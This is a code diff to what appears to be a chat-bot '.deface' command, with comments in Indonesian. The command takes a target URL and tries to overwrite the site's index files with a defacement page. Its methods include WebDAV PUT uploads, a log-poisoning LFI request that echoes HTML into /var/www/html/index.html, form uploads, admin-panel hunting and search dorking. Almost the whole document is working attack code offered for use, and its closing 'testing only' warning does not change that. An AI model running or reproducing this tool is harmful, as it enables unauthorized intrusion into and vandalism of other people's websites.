@@ -1,5 +1,3 @@
-
-
 let handler = async (m, { text, sock }) => {
   if (!text) return m.reply(`📌 *Cara pakai:*\n.deface https://target.com\n\nContoh: .deface https://example.com`)
 
@@ -12,7 +10,7 @@ let handler = async (m, { text, sock }) => {
 
   try {
     // ============================================
-    // HTML DEFACE KEREN
+    // HTML DEFACE KEREN (gaya Barz)
     // ============================================
     let html = `<!DOCTYPE html>
 <html>
@@ -128,30 +126,73 @@ let handler = async (m, { text, sock }) => {
 </html>`
 
     // ============================================
-    // 17 METODE DEFACE
+    // STEP 1: DETEKSI FILE UTAMA
+    // ============================================
+    let mainFiles = []
+    let possibleFiles = [
+      'index.html', 'index.php', 'index.htm', 'default.html', 
+      'default.php', 'home.html', 'home.php', 'main.html',
+      'main.php', 'index.asp', 'default.asp', 'index.aspx',
+      'default.aspx', 'index.jsp', 'default.jsp', 'index.do',
+      'index.cfm', 'index.shtml', 'index.phtml', 'index.xhtml'
+    ]
+
+    for (let file of possibleFiles) {
+      try {
+        let cek = await fetch(target + '/' + file, { method: 'HEAD', timeout: 3000 })
+        if (cek.ok) {
+          mainFiles.push(file)
+        }
+      } catch (e) {}
+    }
+
+    // Kalo ga ada yg detect, pake default
+    if (mainFiles.length === 0) {
+      mainFiles = ['index.html', 'index.php', 'default.html', 'home.html']
+    }
+
+    // ============================================
+    // STEP 2: FILE YANG AKAN DI UPLOAD
+    // ============================================
+    let uploadFiles = [...mainFiles]
+
+    // Tambahan file biar banyak
+    let extraFiles = [
+      'deface.html', 'hacked.html', 'index.html.bak', 'index.php.bak',
+      'index.htm', 'default.html', 'main.html', 'home.html'
+    ]
+
+    for (let f of extraFiles) {
+      if (!uploadFiles.includes(f)) {
+        uploadFiles.push(f)
+      }
+    }
+
+    // ============================================
+    // STEP 3: 17 METODE DEFACE
     // ============================================
     let hasil = []
     let metode = []
 
-    // 1. WebDAV (PUT) — upload file langsung via HTTP PUT
+    // 1. WebDAV (PUT)
     try {
       let opt = await fetch(target, { method: 'OPTIONS', timeout: 8000 })
       let allow = opt.headers.get('allow') || ''
       if (allow.includes('PUT')) {
         metode.push('WebDAV (PUT)')
-        let put = await fetch(target + '/index.html', {
-          method: 'PUT',
-          body: html,
-          headers: { 'Content-Type': 'text/html' },
-          timeout: 10000
-        })
-        if ([200, 201, 204].includes(put.status)) {
-          hasil.push('✅ WebDAV: index.html')
-        } else {
-          hasil.push('❌ WebDAV gagal: ' + put.status)
+        for (let file of uploadFiles) {
+          try {
+            let put = await fetch(target + '/' + file, {
+              method: 'PUT',
+              body: html,
+              headers: { 'Content-Type': 'text/html' },
+              timeout: 10000
+            })
+            if ([200, 201, 204].includes(put.status)) {
+              hasil.push(`✅ WebDAV: ${file}`)
+            }
+          } catch (e) {}
         }
-        await fetch(target + '/index.php', { method: 'PUT', body: html, headers: { 'Content-Type': 'text/html' }, timeout: 10000 })
-        await fetch(target + '/default.html', { method: 'PUT', body: html, headers: { 'Content-Type': 'text/html' }, timeout: 10000 })
       }
     } catch (e) { hasil.push('❌ WebDAV error: ' + e.message) }
 
@@ -164,7 +205,7 @@ let handler = async (m, { text, sock }) => {
       }
     } catch (e) {}
 
-    // 3. LFI (Local File Inclusion) + Log Poisoning
+    // 3. LFI + Log Poisoning
     try {
       let lfi = await fetch(target + `?page=../../../../var/log/apache2/access.log&cmd=echo '${html}' > /var/www/html/index.html`, { timeout: 8000 })
       if (lfi.status === 200) {
@@ -173,7 +214,7 @@ let handler = async (m, { text, sock }) => {
       }
     } catch (e) {}
 
-    // 4. File Upload via form
+    // 4. File Upload
     try {
       let upload = await fetch(target + '/upload', {
         method: 'POST',
@@ -290,7 +331,7 @@ let handler = async (m, { text, sock }) => {
       }
     } catch (e) {}
 
-    // 15. Admin Finder (cari panel admin)
+    // 15. Admin Finder
     let adminPaths = ['/admin', '/login', '/wp-admin', '/administrator', '/admincp', '/cpanel', '/panel']
     for (let path of adminPaths) {
       try {
@@ -302,7 +343,7 @@ let handler = async (m, { text, sock }) => {
       } catch (e) {}
     }
 
-    // 16. Bing Dorking (cari subdomain)
+    // 16. Bing Dorking
     try {
       let dork = await fetch(`https://www.bing.com/search?q=site:${target.replace('https://', '').replace('http://', '')}`, { timeout: 8000 })
       if (dork.status === 200) {
@@ -360,10 +401,9 @@ ${metode.map(m => `   • ${m}`).join('\n')}
 📌 *Hasil:*
 ${hasil.join('\n')}
 
-📄 *HTML Deface terupload ke:* ${target}/index.html
+📄 *File di-deface:* ${uploadFiles.join(', ')}
 
 ⚠️ *PERINGATAN:*
-
 • Website target telah dimodifikasi.
 • Gunakan hanya untuk testing website sendiri.
 • Deface tanpa izin = ILEGAL.`
